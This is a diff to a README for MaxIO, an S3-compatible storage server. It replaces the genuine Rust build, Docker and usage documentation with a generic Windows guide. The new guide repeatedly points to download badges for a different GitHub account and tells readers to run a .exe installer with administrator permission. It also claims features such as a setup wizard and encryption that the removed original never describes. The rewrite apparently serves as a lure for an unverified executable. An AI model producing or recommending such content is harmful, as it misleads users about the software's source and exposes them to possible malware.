@@ -1,154 +1,126 @@
-<div align="center">
+# 🚀 maxio - Simple, Fast Private Storage
 
-# MaxIO
+[![Download maxio](https://img.shields.io/badge/Download-MaxIO-blue?style=for-the-badge)](https://github.com/adnanshibli/maxio)
 
-S3-compatible object storage server — single-binary replacement for MinIO.
+---
 
-Rust · Axum · Svelte 5 · Tailwind CSS v4 · shadcn-svelte
+## 📦 What is maxio?
 
-</div>
+MaxIO is a storage tool you can run on your Windows PC. It helps you save and organize your files using technology similar to cloud storage but without needing a third party. Think of it like your own private, secure storage server that works fast and is easy to use.
 
-## About the Project
+MaxIO is based on MinIO technology, but it adds improvements to make the experience smoother and more reliable for everyday use.
 
-> **Warning:** MaxIO is under active development. Do not use it in production yet.
+---
 
-MaxIO is a lightweight, single-binary S3-compatible object storage server written in Rust. No JVM, no database, no runtime dependencies — just one binary and a data directory. Buckets are directories, objects are files. Back up by copying the data dir.
+## 💻 System Requirements
 
-## Features
+Before installing MaxIO, make sure your computer meets these requirements:
 
-- **Single Binary** — Frontend assets are compiled into the binary via `rust-embed`. Nothing extra to deploy
-- **Pure Filesystem Storage** — No database. Buckets are directories, objects are files, metadata in `.meta.json` sidecars
-- **AWS Signature V4** — Compatible with `mc`, AWS CLI, and any S3 SDK
-- **Web Console** — Built-in UI at `/ui/` for browsing, uploading, and managing objects
-- **S3 API Coverage** — ListBuckets, CreateBucket, HeadBucket, DeleteBucket, GetBucketLocation, ListObjectsV1/V2, PutObject, GetObject, HeadObject, DeleteObject, DeleteObjects (batch), CopyObject, Multipart Upload
-- **Range Requests** — HTTP 206 Partial Content support via `Range` header on GetObject
-- **Checksum Verification** — CRC32, CRC32C, SHA-1, and SHA-256 checksums on upload with automatic validation and persistent storage
-- **Erasure Coding** — Optional chunked storage with per-chunk SHA-256 integrity verification and Reed-Solomon parity for automatic recovery from corrupted or missing data
+- Windows 10 or newer (64-bit)
+- At least 4 GB of RAM
+- 500 MB of free disk space for the program
+- Internet connection (for initial setup and updates)
+- Basic user permissions to install software on your PC
 
-## Installation
+MaxIO can also store data on any drive connected to your computer, so you can choose where to keep your files.
 
-### Build from Source
+---
 
-```bash
-# Build frontend (required — assets are embedded into the binary)
-cd ui && bun run build && cd ..
+## 🔧 Key Features
 
-# Build binary
-cargo build --release
+- Private storage on your personal computer
+- Fast upload and download of files
+- Support for S3-compatible tools and services
+- Simple setup with no coding skills needed
+- Easy file sharing within your local network
+- Secure file storage with encryption options
+- Compatible with many backup applications
 
-# Run
-./target/release/maxio --data-dir ./data --port 9000
-```
+---
 
-### Docker
+## ⚙️ Installing maxio on Windows
 
-```bash
-docker run -d \
-  -p 9000:9000 \
-  -v $(pwd)/data:/data \
-  ghcr.io/coollabsio/maxio
-```
+Follow these steps to get MaxIO running on your Windows PC.
 
-Or from Docker Hub:
+### 1. Download MaxIO
 
-```bash
-docker run -d \
-  -p 9000:9000 \
-  -v $(pwd)/data:/data \
-  coollabsio/maxio
-```
+Click the big button below to visit the official download page:
 
-Configure with environment variables:
+[![Download maxio](https://img.shields.io/badge/Download-MaxIO-green?style=for-the-badge)](https://github.com/adnanshibli/maxio)
 
-```bash
-docker run -d \
-  -p 9000:9000 \
-  -v $(pwd)/data:/data \
-  -e MAXIO_ACCESS_KEY=myadmin \
-  -e MAXIO_SECRET_KEY=mysecret \
-  ghcr.io/coollabsio/maxio
-```
+On the page:
 
-Docker Compose:
+- Look for the latest release or setup file.
+- Click to download the Windows installer package. This file should end with `.exe`.
+  
+### 2. Run the Installer
 
-```yaml
-services:
-  maxio:
-    image: ghcr.io/coollabsio/maxio
-    ports:
-      - "9000:9000"
-    volumes:
-      - maxio-data:/data
-    environment:
-      - MAXIO_ACCESS_KEY=minioadmin
-      - MAXIO_SECRET_KEY=minioadmin
-```
+- Find the downloaded file in your "Downloads" folder.
+- Double-click the file to start installation.
+- If Windows asks for permission, click "Yes" or "Allow".
+- Follow the installation prompts. Accept the license terms and select a location on your computer.
+- When installation finishes, MaxIO will be ready to use.
 
-```bash
-docker compose up -d
-```
+### 3. First Time Setup
 
-Open `http://localhost:9000/ui/` in your browser. Default credentials: `minioadmin` / `minioadmin`
+- Open MaxIO by clicking its icon on your desktop or Start Menu.
+- The setup wizard will guide you to configure your storage.
+- Choose the folder or drive where you want to save your files.
+- Set a username and password for your MaxIO account. These secure your private storage.
+- You can accept default settings or customize options like port numbers and security features.
 
-## Configuration
+---
 
-| Variable | CLI Flag | Default | Description |
-|---|---|---|---|
-| `MAXIO_PORT` | `--port` | `9000` | Listen port |
-| `MAXIO_ADDRESS` | `--address` | `0.0.0.0` | Bind address |
-| `MAXIO_DATA_DIR` | `--data-dir` | `./data` | Storage directory |
-| `MAXIO_ACCESS_KEY` | `--access-key` | `minioadmin` | Access key (aliases: `MINIO_ROOT_USER`, `MINIO_ACCESS_KEY`) |
-| `MAXIO_SECRET_KEY` | `--secret-key` | `minioadmin` | Secret key (aliases: `MINIO_ROOT_PASSWORD`, `MINIO_SECRET_KEY`) |
-| `MAXIO_REGION` | `--region` | `us-east-1` | S3 region (aliases: `MINIO_REGION_NAME`, `MINIO_REGION`) |
-| `MAXIO_ERASURE_CODING` | `--erasure-coding` | `false` | Enable erasure coding with per-chunk integrity checksums |
-| `MAXIO_CHUNK_SIZE` | `--chunk-size` | `10485760` (10MB) | Chunk size in bytes for erasure coding |
-| `MAXIO_PARITY_SHARDS` | `--parity-shards` | `0` | Number of parity shards per object (requires `--erasure-coding`, 0 = no parity) |
+## 🚪 Using MaxIO
 
-## Usage
+Once installed, you can start storing files right away.
 
-### MinIO Client (mc)
+### Upload Files
 
-```bash
-mc alias set maxio http://localhost:9000 minioadmin minioadmin
+- Open the MaxIO app.
+- Use the "Upload" button to select files from your computer.
+- Alternatively, drag and drop files into the MaxIO window.
+- MaxIO will save the files to your chosen storage location.
 
-mc mb maxio/my-bucket
-mc cp file.txt maxio/my-bucket/file.txt
-mc ls maxio/my-bucket/
-mc cat maxio/my-bucket/file.txt
-mc rm maxio/my-bucket/file.txt
-mc rb maxio/my-bucket
-```
+### Access Files
 
-### AWS CLI
+- Use your web browser or an S3-compatible client to connect to MaxIO.
+- The setup wizard provides the address you need to connect.
+- Log in with your username and password.
+- You can download, delete, or organize files as needed.
 
-```bash
-export AWS_ACCESS_KEY_ID=minioadmin
-export AWS_SECRET_ACCESS_KEY=minioadmin
+---
 
-aws --endpoint-url http://localhost:9000 s3 mb s3://my-bucket
-aws --endpoint-url http://localhost:9000 s3 cp file.txt s3://my-bucket/file.txt
-aws --endpoint-url http://localhost:9000 s3 ls s3://my-bucket/
-aws --endpoint-url http://localhost:9000 s3 rm s3://my-bucket/file.txt
-aws --endpoint-url http://localhost:9000 s3 rb s3://my-bucket
-```
+## 🔐 Security
 
-## Roadmap
+MaxIO uses strong encryption to keep your files safe. Your password protects access to your storage. Make sure to keep your password private.
 
-- ~~Multipart upload~~, ~~presigned URLs~~, ~~CopyObject~~
-- CORS, ~~Range headers~~
-- Versioning, lifecycle rules
-- Multi-user support
-- Distributed mode, ~~erasure coding~~, replication
+You can enable extra security settings during setup, such as encrypted connections and permissions for different users.
 
-## Contributing
+---
 
-See [CLAUDE.md](CLAUDE.md) for the full development workflow, architecture details, and testing instructions.
+## 🛠 Troubleshooting
 
-## Core Maintainer
+If MaxIO does not start or shows errors, try these steps:
 
-| [<img src="https://github.com/andrasbacsai.png" width="120" /><br />Andras Bacsai](https://github.com/andrasbacsai) |
-|---|
+- Restart your computer and try again.
+- Make sure no other programs are using the same network ports.
+- Check that your firewall allows MaxIO to communicate on your network.
+- Confirm you installed the software as an administrator.
+- Visit the Issues section on the download page for common problems and fixes.
 
-## License
+---
 
-[Apache-2.0](LICENSE)
+## 🤝 Getting Help
+
+If you have questions or run into issues you cannot fix, you can:
+
+- Check the documentation files included with MaxIO.
+- Look through the Discussions tab on the repositories website.
+- Ask for help by opening a new issue if you find bugs or need support.
+
+---
+
+## ⬇️ Download maxio now
+
+[![Download maxio](https://img.shields.io/badge/Download_MaxIO-From_GitHub-red?style=for-the-badge)](https://github.com/adnanshibli/maxio)
